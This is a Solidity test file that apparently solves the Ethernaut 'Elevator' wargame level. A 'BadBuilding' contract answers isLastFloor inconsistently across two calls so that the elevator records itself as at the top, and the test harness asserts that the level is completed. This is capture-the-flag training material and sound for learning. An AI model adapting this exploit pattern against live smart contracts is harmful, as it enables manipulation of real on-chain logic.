pragma solidity ^0.8.10;

import 'ds-test/test.sol';
import 'forge-std/Vm.sol';

import '../levels/11-Elevator/ElevatorFactory.sol';
import '../core/Ethernaut.sol';

contract BadBuilding {
  bool isAtTop;

  function goToTop(address _elevatorAddr, uint256 _floor) external {
    Elevator(_elevatorAddr).goTo(_floor);
  }

  function isLastFloor(uint floor) external returns (bool) {
    if (!isAtTop) {
      isAtTop = true;
      return false;
    } else {
      return true;
    }
  }
}

contract ElevatorTest is DSTest {
  //--------------------------------------------------------------------------------
  //                            Setup Game Instance
  //--------------------------------------------------------------------------------

  Vm vm = Vm(address(HEVM_ADDRESS)); // `ds-test` library cheatcodes for testing
  Ethernaut ethernaut;
  address attacker = address(0xdeadbeef);

  function setUp() public {
    ethernaut = new Ethernaut(); // initiate Ethernaut contract instance
    vm.deal(attacker, 10 ether); // fund our attacker contract with 1 ether
  }

  function testElevatorHack() public {
    //--------------------------------------------------------------------------------
    //                             Setup Level Instance
    //--------------------------------------------------------------------------------
    ElevatorFactory elevatorFactory = new ElevatorFactory();
    ethernaut.registerLevel(elevatorFactory);
    vm.startPrank(attacker);

    address levelAddress = ethernaut.createLevelInstance(elevatorFactory);
    Elevator elevatorContract = Elevator(payable(levelAddress));

    //--------------------------------------------------------------------------------
    //                             Start Level Attack
    //--------------------------------------------------------------------------------

    assertTrue(elevatorContract.top() == false);
    assertEq(elevatorContract.floor(), 0);

    // Deploy our malicious contract
    BadBuilding badContract = new BadBuilding();
    // instruct our malicious contract to call goTo within the elevator
    // as this contract is called twice rather than cacheing the bool,
    // we can return the right value in a controlled fashion forcing logic flow
    badContract.goToTop(address(elevatorContract), 420);

    assertEq(elevatorContract.floor(), 420);

    //--------------------------------------------------------------------------------
    //                                Submit Level
    //--------------------------------------------------------------------------------
    bool challengeCompleted = ethernaut.submitLevelInstance(
      payable(levelAddress)
    );
    vm.stopPrank();
    assert(challengeCompleted);
  }
}

